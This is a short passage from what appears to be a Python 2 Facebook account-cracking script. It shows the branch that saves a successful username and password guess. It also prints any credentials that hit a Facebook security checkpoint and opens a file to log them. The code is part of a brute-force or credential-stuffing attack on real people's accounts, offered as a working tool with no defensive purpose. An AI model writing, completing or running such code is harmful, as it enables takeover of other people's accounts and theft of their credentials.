                                    oks.append(user + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;97m[CP+]\x1b[1;97m \x1b[1;92m⌬\x1b[1;97m ' + user + ' \x1b[1;92m⌬\x1b[1;97m ' + pass6
                                    cek = open('out/checkpoint.txt', 'a')
